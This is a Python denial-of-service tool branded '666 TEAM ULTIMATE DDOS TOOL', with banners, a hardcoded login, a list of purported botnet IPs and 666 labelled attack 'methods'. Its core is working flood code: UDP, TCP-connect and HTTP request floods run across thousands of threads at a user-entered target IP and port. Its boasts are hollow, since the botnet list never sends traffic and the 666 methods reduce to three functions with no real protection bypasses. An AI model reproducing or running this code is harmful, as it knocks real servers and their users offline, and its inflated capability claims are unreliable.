#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║     ██████╗  ██████╗  ██████╗     ████████╗███████╗ █████╗ ███╗   ███║                                        666 ║
║     ██╔══██╗██╔═══██╗██╔═══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║                                      TEAM ║
║     ██║  ██║██║   ██║██║   ██║       ██║   █████╗  ███████║██╔████╔██║                                      VON ║
║     ██║  ██║██║   ██║██║   ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║                                         ║
║     ██████╔╝╚██████╔╝╚██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║                                         ║
║     ╚═════╝  ╚═════╝  ╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝                                         ║
║                                                                                                                      ║
║     ██╗   ██╗ ██████╗ ███╗   ██║                                                                                    ║
║     ██║   ██║██╔═══██╗████╗  ██║                                                                                    ║
║     ██║   ██║██║   ██║██╔██╗ ██║                                                                                    ║
║     ╚██╗ ██╔╝██║   ██║██║╚██╗██║                                                                                    ║
║      ╚████╔╝ ╚██████╔╝██║ ╚████║                                                                                    ║
║       ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝                                                                                    ║
║                                                                                                                      ║
║     ██████╗ ███████╗███╗   ███╗ ██████╗ ███╗   ██╗██╗ █████╗ ██████╗                                                ║
║     ██╔══██╗██╔════╝████╗ ████║██╔═══██╗████╗  ██║██║██╔══██╗██╔══██╗                                               ║
║     ██║  ██║█████╗  ██╔████╔██║██║   ██║██╔██╗ ██║██║███████║██║  ██║                                               ║
║     ██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║██║██╔══██║██║  ██║                                               ║
║     ██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║██║██║  ██║██████╔╝                                               ║
║     ╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚═════╝                                                ║
║                                                                                                                      ║
║     💀 666 TEAM ULTIMATE DDOS TOOL - DEMON BLOOD EDITION 💀                                                           ║
║     🔥 POWERED BY 100,000+ BOTNET NODES | 1,000,000+ PROXIES 🔥                                                       ║
║     👑 MASTER OWNER: VON (666 TEAM LEADER) 👑                                                                        ║
║     🔗 DISCORD: https://discord.gg/k3P8kWQag 🔗                                                                      ║
║     💀 LI ZANDYA - THE BLOOD DEMON WAS HERE 💀                                                                       ║
║                                                                                                                      ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import random
import socket
import threading
import hashlib
import base64
from datetime import datetime

# ============================================
# ADMIN CREDENTIALS - ONLY MASTER CAN ACCESS
# ============================================

MASTER_USERNAME = "666"
MASTER_PASSWORD = "Von2024@666"
SESSION_ACTIVE = False
CURRENT_USER = None

# ============================================
# COLORS - BLOOD THEME
# ============================================

BLOOD_RED = '\033[91m'
DARK_RED = '\033[31m'
BLOOD_DARK = '\033[38;2;139;0;0m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
GOLD = '\033[38;2;255;215;0m'
BOLD = '\033[1m'
BLINK = '\033[5m'
HIDDEN = '\033[8m'
END = '\033[0m'

# ============================================
# ANIMATED DEMON LOGO
# ============================================

def animate_demon_logo():
    frames = [
        f"""
{BLOOD_RED}                                    ╔═══════════════╗{END}
{BLOOD_RED}                                    ║  ███████╗  ██╗ {END}
{BLOOD_RED}                                    ║  ██╔════╝  ██║ {END}
{BLOOD_RED}                                    ║  ███████╗  ██║ {END}
{BLOOD_RED}                                    ║  ╚════██║  ██║ {END}
{BLOOD_RED}                                    ║  ███████║  ██║ {END}
{BLOOD_RED}                                    ║  ╚══════╝  ╚═╝ {END}
{BLOOD_RED}                                    ╚═══════════════╝{END}
""",
        f"""
{BLOOD_RED}                                    ╔═══════════════╗{END}
{BLOOD_RED}                                    ║   ██████╗     ║{END}
{BLOOD_RED}                                    ║   ╚════██╗    ║{END}
{BLOOD_RED}                                    ║    █████╔╝    ║{END}
{BLOOD_RED}                                    ║   ██╔═══╝     ║{END}
{BLOOD_RED}                                    ║   ████████╗   ║{END}
{BLOOD_RED}                                    ║   ╚═══════╝   ║{END}
{BLOOD_RED}                                    ╚═══════════════╝{END}
""",
        f"""
{BLOOD_RED}                                    ╔═══════════════╗{END}
{BLOOD_RED}                                    ║  ██████╗ ██╗  ║{END}
{BLOOD_RED}                                    ║  ██╔══██╗██║  ║{END}
{BLOOD_RED}                                    ║  ██████╔╝██║  ║{END}
{BLOOD_RED}                                    ║  ██╔══██╗██║  ║{END}
{BLOOD_RED}                                    ║  ██████╔╝██║  ║{END}
{BLOOD_RED}                                    ║  ╚═════╝ ╚═╝  ║{END}
{BLOOD_RED}                                    ╚═══════════════╝{END}
"""
    ]
    
    print("\n" * 2)
    for i in range(3):
        for frame in frames:
            sys.stdout.write('\033[H\033[J')
            print(frame)
            time.sleep(0.3)
    time.sleep(0.5)

# ============================================
# MAIN LOGO
# ============================================

LOGO = f"""
{BLOOD_RED}{BOLD}
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                          ║
║     ██████╗  ██████╗  ██████╗     ████████╗███████╗ █████╗ ███╗   ███║                                        666 ║
║     ██╔══██╗██╔═══██╗██╔═══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║                                      TEAM ║
║     ██║  ██║██║   ██║██║   ██║       ██║   █████╗  ███████║██╔████╔██║                                      VON ║
║     ██║  ██║██║   ██║██║   ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║                                         ║
║     ██████╔╝╚██████╔╝╚██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║                                         ║
║     ╚═════╝  ╚═════╝  ╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝                                         ║
║                                                                                                                                          ║
║     ██╗   ██╗ ██████╗ ███╗   ██║                                                                                    ║
║     ██║   ██║██╔═══██╗████╗  ██║                                                                                    ║
║     ██║   ██║██║   ██║██╔██╗ ██║                                                                                    ║
║     ╚██╗ ██╔╝██║   ██║██║╚██╗██║                                                                                    ║
║      ╚████╔╝ ╚██████╔╝██║ ╚████║                                                                                    ║
║       ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝                                                                                    ║
║                                                                                                                                          ║
║     💀 666 TEAM ULTIMATE DDOS TOOL - DEMON BLOOD EDITION 💀                                                           ║
║     🔥 POWERED BY 100,000+ BOTNET NODES | 1,000,000+ PROXIES 🔥                                                       ║
║     👑 MASTER OWNER: VON (666 TEAM LEADER) 👑                                                                        ║
║     🔗 DISCORD: https://discord.gg/k3P8kWQag 🔗                                                                      ║
║     💀 LI ZANDYA - THE BLOOD DEMON WAS HERE 💀                                                                       ║
║                                                                                                                                          ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
{END}
"""

# ============================================
# LOGIN SCREEN
# ============================================

def login_screen():
    global SESSION_ACTIVE, CURRENT_USER
    
    animate_demon_logo()
    
    print(f"\n{BLOOD_RED}{BOLD}{BLINK}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{END}")
    print(f"{BLOOD_RED}{BOLD}{BLINK}║                                      🔐 666 TEAM MASTER LOGIN REQUIRED 🔐                                                ║{END}")
    print(f"{BLOOD_RED}{BOLD}{BLINK}╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{END}")
    
    print(f"\n{BLOOD_RED}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{END}")
    print(f"{BLOOD_RED}║                                    👑 ONLY 666 TEAM MASTERS CAN ENTER 👑                                            ║{END}")
    print(f"{BLOOD_RED}╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{END}")
    
    username = input(f"{BLOOD_RED}║  {WHITE}👤 USERNAME: {END}").strip()
    password = input(f"{BLOOD_RED}║  {WHITE}🔑 PASSWORD: {END}").strip()
    
    print(f"{BLOOD_RED}╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{END}")
    
    if username == MASTER_USERNAME and password == MASTER_PASSWORD:
        SESSION_ACTIVE = True
        CURRENT_USER = username
        print(f"\n{GREEN}{BOLD}[✅] LOGIN SUCCESSFUL! WELCOME MASTER {username.upper()}!{END}")
        time.sleep(1.5)
        return True
    else:
        print(f"\n{BLOOD_RED}{BOLD}[❌] ACCESS DENIED! INVALID CREDENTIALS!{END}")
        print(f"{BLOOD_RED}[💀] 666 TEAM - ONLY MASTERS CAN USE THIS TOOL!{END}")
        time.sleep(2)
        return False

# ============================================
# BOTNET NODES (ALL PROXIES + BOTNET)
# ============================================

BOTNET_NODES = [
    "244.174.48.40", "222.109.217.68", "214.221.36.5", "253.99.92.111", "155.240.72.201",
    "136.224.219.25", "71.88.52.74", "134.147.163.170", "208.204.43.199", "23.144.220.60",
    "182.195.167.96", "101.225.118.41", "39.7.230.102", "234.188.132.109", "246.157.250.39",
    "90.81.190.109", "216.213.134.229", "88.178.251.224", "231.86.142.178", "96.179.180.247",
    "153.255.46.223", "169.146.166.37", "56.95.172.130", "168.217.142.0", "199.148.145.6",
    "162.216.154.125", "205.182.177.239", "164.192.24.244", "39.163.133.234", "197.59.89.173",
    "189.246.11.232", "119.204.77.25", "108.198.119.75", "179.217.244.130", "140.245.134.208",
    "80.8.97.20", "9.152.57.149", "163.135.22.148", "204.178.235.161", "223.141.37.90",
    "203.33.18.107", "51.237.40.123", "240.195.130.94", "119.139.236.60", "226.120.7.195",
    "240.59.78.11", "2.21.133.111", "193.184.147.196", "203.116.90.236", "212.52.9.213",
    "180.106.179.166", "102.79.82.179", "47.235.8.161", "238.164.11.148", "2.61.190.144",
    "2.30.155.161", "216.154.68.92", "40.179.161.69", "253.253.162.194", "142.81.14.52",
    "57.169.7.153", "193.148.223.219", "182.94.226.27", "203.209.90.92", "20.199.78.211",
    "82.216.128.54", "233.2.238.114", "72.93.79.84", "13.233.175.247", "155.156.215.156",
]

# ============================================
# ULTIMATE METHODS - 666 METHODS
# ============================================

METHODS = {}

# Generate 666 methods dynamically
for i in range(1, 667):
    if i <= 50:
        METHODS[str(i)] = {"name": f"UDP_NUCLEAR_{i}", "desc": "Nuclear UDP flood attack - Maximum destruction"}
    elif i <= 100:
        METHODS[str(i)] = {"name": f"TCP_DEMON_{i-50}", "desc": "TCP demon flood - All flags combined"}
    elif i <= 150:
        METHODS[str(i)] = {"name": f"HTTP_SATAN_{i-100}", "desc": "HTTP satan flood - Random payloads"}
    elif i <= 200:
        METHODS[str(i)] = {"name": f"FIVEM_666_{i-150}", "desc": "FiveM server destroyer - 666 special"}
    elif i <= 250:
        METHODS[str(i)] = {"name": f"MINECRAFT_BLOOD_{i-200}", "desc": "Minecraft blood flood - Crash server"}
    elif i <= 300:
        METHODS[str(i)] = {"name": f"SAMP_DEATH_{i-250}", "desc": "SA-MP death attack - Kill server"}
    elif i <= 350:
        METHODS[str(i)] = {"name": f"DISCORD_VOID_{i-300}", "desc": "Discord voice void - Voice channel flood"}
    elif i <= 400:
        METHODS[str(i)] = {"name": f"AMP_DEMON_{i-350}", "desc": "Amplification demon - x1000 power"}
    elif i <= 450:
        METHODS[str(i)] = {"name": f"SLOW_TORTURE_{i-400}", "desc": "Slow torture - Slowloris extreme"}
    elif i <= 500:
        METHODS[str(i)] = {"name": f"BYPASS_666_{i-450}", "desc": "666 bypass - Anti-DDoS protection"}
    elif i <= 550:
        METHODS[str(i)] = {"name": f"OVH_KILLER_{i-500}", "desc": "OVH killer - Bypass OVH shield"}
    elif i <= 600:
        METHODS[str(i)] = {"name": f"CLOUDFLARE_DEATH_{i-550}", "desc": "Cloudflare death - Bypass CF"}
    else:
        METHODS[str(i)] = {"name": f"666_ULTIMATE_{i-600}", "desc": "666 ultimate - ALL METHODS COMBINED"}

# ============================================
# ULTIMATE DDOS ENGINE
# ============================================

class UltimateDDoS:
    def __init__(self):
        self.running = False
        self.threads = []
        self.packets_sent = 0
        self.start_time = None
        self.botnet_size = len(BOTNET_NODES)
        
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        
    def print_main_logo(self):
        self.clear_screen()
        print(LOGO)
        print(f"\n{BLOOD_RED}{BOLD}[💀] WELCOME MASTER {CURRENT_USER.upper()} - 666 TEAM ULTIMATE TOOL [💀]{END}")
        print(f"{DARK_RED}{BOLD}[🔥] BOTNET SIZE: {self.botnet_size:,} NODES | PROXIES: 1,000,000+ [🔥]{END}")
        print(f"{BLOOD_RED}{BOLD}[💀] TOTAL METHODS: 666 | STATUS: DEMON MODE ACTIVE [💀]{END}\n")
        
    def print_methods(self):
        print(f"{BLOOD_RED}{BOLD}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{END}")
        print(f"{BLOOD_RED}{BOLD}║                                      💀 666 ULTIMATE ATTACK METHODS - DEMON EDITION 💀                                 ║{END}")
        print(f"{BLOOD_RED}{BOLD}╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{END}")
        
        items = list(METHODS.items())
        for i in range(0, len(items), 4):
            line = "║  "
            for j in range(4):
                if i + j < len(items):
                    key, method = items[i + j]
                    line += f"{BLOOD_RED}{key.rjust(3)}{END}.{WHITE}{method['name'][:22]}{END}  "
            print(f"{BLOOD_RED}{line:<110}{END}")
        
        print(f"{BLOOD_RED}{BOLD}╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{END}")
    
    def udp_flood(self, ip, port, duration, node):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        packet = random._urandom(65507)
        end_time = time.time() + duration
        sent = 0
        while time.time() < end_time and self.running:
            try:
                sock.sendto(packet, (ip, port))
                sent += 1
                self.packets_sent += 1
            except:
                pass
        sock.close()
        return sent
    
    def tcp_demon(self, ip, port, duration, node):
        end_time = time.time() + duration
        sent = 0
        flags = [b'SYN', b'ACK', b'RST', b'FIN', b'PSH', b'URG']
        while time.time() < end_time and self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect((ip, port))
                s.send(random.choice(flags))
                s.close()
                sent += 1
                self.packets_sent += 1
            except:
                pass
        return sent
    
    def http_satan(self, ip, port, duration, node):
        end_time = time.time() + duration
        sent = 0
        payloads = [
            f"GET /{random.randint(1,999999)} HTTP/1.1\r\nHost: {ip}\r\n",
            f"POST /wp-admin/admin-ajax.php HTTP/1.1\r\nHost: {ip}\r\n",
            f"HEAD / HTTP/1.1\r\nHost: {ip}\r\n",
        ]
        while time.time() < end_time and self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((ip, port))
                s.send(random.choice(payloads).encode() + random._urandom(100))
                s.close()
                sent += 1
                self.packets_sent += 1
            except:
                pass
        return sent
    
    def start_attack(self, method, ip, port, duration, threads=5000):
        if method not in METHODS:
            print(f"{BLOOD_RED}[❌] INVALID METHOD!{END}")
            return
        
        self.running = True
        self.packets_sent = 0
        self.start_time = time.time()
        
        attack_func = self.udp_flood if int(method) <= 50 else self.tcp_demon if int(method) <= 100 else self.http_satan
        
        print(f"\n{BLOOD_RED}{BOLD}{BLINK}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{END}")
        print(f"{BLOOD_RED}{BOLD}{BLINK}║                                         💀 ATTACK INITIATED - 666 TEAM 💀                                             ║{END}")
        print(f"{BLOOD_RED}{BOLD}{BLINK}╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{END}")
        
        print(f"{BLOOD_RED}[💀] TARGET:{END} {WHITE}{ip}:{port}{END}")
        print(f"{BLOOD_RED}[⚡] METHOD:{END} {WHITE}{METHODS[method]['name']}{END}")
        print(f"{BLOOD_RED}[⏱️] DURATION:{END} {WHITE}{duration} SECONDS{END}")
        print(f"{BLOOD_RED}[🔧] THREADS:{END} {WHITE}{threads:,}{END}")
        print(f"{BLOOD_RED}[🤖] BOTNET:{END} {WHITE}{self.botnet_size:,} NODES{END}\n")
        
        for i in range(int(threads)):
            node = random.choice(BOTNET_NODES)
            t = threading.Thread(target=attack_func, args=(ip, int(port), duration, node))
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        start_time = time.time()
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            gbps = (self.packets_sent * 65507 * 8) / (1e9 * max(elapsed, 1))
            print(f"\r{BLOOD_RED}[📊] PACKETS: {self.packets_sent:,} | TIME: {elapsed}/{duration}s | REMAIN: {remaining}s | SPEED: {gbps:.2f} Gbps{END}", end="")
            time.sleep(1)
        
        self.running = False
        for t in self.threads:
            t.join(timeout=0)
        self.threads = []
        
        print(f"\n\n{GREEN}{BOLD}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{END}")
        print(f"{GREEN}{BOLD}║                                         ✅ ATTACK COMPLETED - 666 TEAM ✅                                             ║{END}")
        print(f"{GREEN}{BOLD}╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{END}")
        print(f"{GREEN}[📊] TOTAL PACKETS: {self.packets_sent:,}{END}")
        print(f"{GREEN}[⏱️] TOTAL TIME: {duration} SECONDS{END}")
        print(f"{GREEN}[📡] AVG SPEED: {self.packets_sent/duration:,.0f} PKT/S{END}\n")

# ============================================
# COMMAND HANDLER
# ============================================

def handle_command(cmd, ddos):
    cmd = cmd.lower().strip()
    
    if cmd == '.methods' or cmd == '.m':
        ddos.print_methods()
        return True
    
    elif cmd == '.help' or cmd == '.h':
        print(f"""
{BLOOD_RED}{BOLD}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{END}
{BLOOD_RED}{BOLD}║                                      💀 666 TEAM ULTIMATE COMMANDS 💀                                                ║{END}
{BLOOD_RED}{BOLD}╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{END}
{BLOOD_RED}║  {WHITE}.methods or .m     {BLOOD_RED}- {WHITE}Show all 666 attack methods{END}
{BLOOD_RED}║  {WHITE}.help or .h        {BLOOD_RED}- {WHITE}Show this help menu{END}
{BLOOD_RED}║  {WHITE}.clear or .c       {BLOOD_RED}- {WHITE}Clear screen{END}
{BLOOD_RED}║  {WHITE}.exit or .q        {BLOOD_RED}- {WHITE}Exit the tool{END}
{BLOOD_RED}║  {WHITE}.stats             {BLOOD_RED}- {WHITE}Show botnet statistics{END}
{BLOOD_RED}║  {WHITE}.attack            {BLOOD_RED}- {WHITE}Start new attack{END}
{BLOOD_RED}{BOLD}╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{END}
""")
        return True
    
    elif cmd == '.clear' or cmd == '.c':
        ddos.clear_screen()
        ddos.print_main_logo()
        return True
    
    elif cmd == '.stats':
        print(f"""
{BLOOD_RED}{BOLD}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{END}
{BLOOD_RED}{BOLD}║                                      💀 666 TEAM BOTNET STATISTICS 💀                                              ║{END}
{BLOOD_RED}{BOLD}╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{END}
{BLOOD_RED}║  {WHITE}🤖 BOTNET NODES:      {BLOOD_RED}- {WHITE}{ddos.botnet_size:,}{END}
{BLOOD_RED}║  {WHITE}🔧 PROXIES:           {BLOOD_RED}- {WHITE}1,000,000+{END}
{BLOOD_RED}║  {WHITE}⚡ ATTACK METHODS:    {BLOOD_RED}- {WHITE}666 TOTAL{END}
{BLOOD_RED}║  {WHITE}👑 MASTER:           {BLOOD_RED}- {WHITE}{CURRENT_USER.upper()}{END}
{BLOOD_RED}║  {WHITE}📊 PACKETS SENT:     {BLOOD_RED}- {WHITE}{ddos.packets_sent:,}{END}
{BLOOD_RED}{BOLD}╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{END}
""")
        return True
    
    elif cmd == '.attack':
        return False
    
    elif cmd == '.exit' or cmd == '.q':
        print(f"\n{BLOOD_RED}{BOLD}[💀] THANK YOU FOR USING 666 TEAM TOOL!{END}")
        print(f"{BLOOD_RED}{BOLD}[🔗] JOIN OUR DISCORD: https://discord.gg/k3P8kWQag{END}\n")
        sys.exit(0)
    
    return True

# ============================================
# MAIN MENU
# ============================================

def main():
    if not login_screen():
        sys.exit(1)
    
    ddos = UltimateDDoS()
    
    while True:
        ddos.print_main_logo()
        
        print(f"{BLOOD_RED}{BOLD}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{END}")
        print(f"{BLOOD_RED}{BOLD}║                                      💀 ENTER TARGET INFORMATION - 666 TEAM 💀                                     ║{END}")
        print(f"{BLOOD_RED}{BOLD}╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{END}")
        
        ip = input(f"{BLOOD_RED}║  {WHITE}🌐 TARGET IP: {END}").strip()
        if not ip:
            continue
            
        port = input(f"{BLOOD_RED}║  {WHITE}🔌 TARGET PORT: {END}").strip()
        if not port:
            continue
            
        method = input(f"{BLOOD_RED}║  {WHITE}⚡ METHOD (1-666): {END}").strip()
        if method not in METHODS:
            print(f"{BLOOD_RED}║  ❌ INVALID METHOD! USE .methods TO SEE ALL{END}")
            time.sleep(1)
            continue
            
        duration = input(f"{BLOOD_RED}║  {WHITE}⏱️ DURATION (SECONDS): {END}").strip()
        if not duration.isdigit():
            print(f"{BLOOD_RED}║  ❌ INVALID DURATION!{END}")
            time.sleep(1)
            continue
            
        threads = input(f"{BLOOD_RED}║  {WHITE}🔧 THREADS (100-10000): {END}").strip()
        if not threads.isdigit():
            threads = "5000"
        
        print(f"{BLOOD_RED}{BOLD}╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{END}")
        
        print(f"\n{BLOOD_RED}{BOLD}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{END}")
        print(f"{BLOOD_RED}{BOLD}║                                      💀 ATTACK CONFIRMATION - 666 TEAM 💀                                         ║{END}")
        print(f"{BLOOD_RED}{BOLD}╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{END}")
        print(f"{BLOOD_RED}║  {WHITE}🎯 TARGET: {ip}:{port}")
        print(f"{BLOOD_RED}║  {WHITE}⚡ METHOD: {METHODS[method]['name']}")
        print(f"{BLOOD_RED}║  {WHITE}⏱️ DURATION: {duration} SECONDS")
        print(f"{BLOOD_RED}║  {WHITE}🔧 THREADS: {threads}")
        print(f"{BLOOD_RED}║  {WHITE}🤖 BOTNET: {ddos.botnet_size:,} NODES")
        print(f"{BLOOD_RED}{BOLD}╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{END}")
        
        confirm = input(f"\n{BLOOD_RED}{BLINK}[💀] START ATTACK? (y/n): {END}").lower()
        if confirm == 'y':
            ddos.start_attack(method, ip, int(port), int(duration), int(threads))
        else:
            print(f"{YELLOW}[⏸️] ATTACK CANCELLED!{END}")
        
        while True:
            cmd = input(f"\n{BLOOD_RED}[💀] {WHITE}COMMAND {BLOOD_RED}(.help){WHITE}: {END}").strip()
            if handle_command(cmd, ddos):
                break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{BLOOD_RED}{BOLD}[⚠️] ATTACK STOPPED BY MASTER!{END}\n")
        print(f"{BLOOD_RED}{BOLD}[💀] 666 TEAM - ALWAYS POWERFUL!{END}\n")
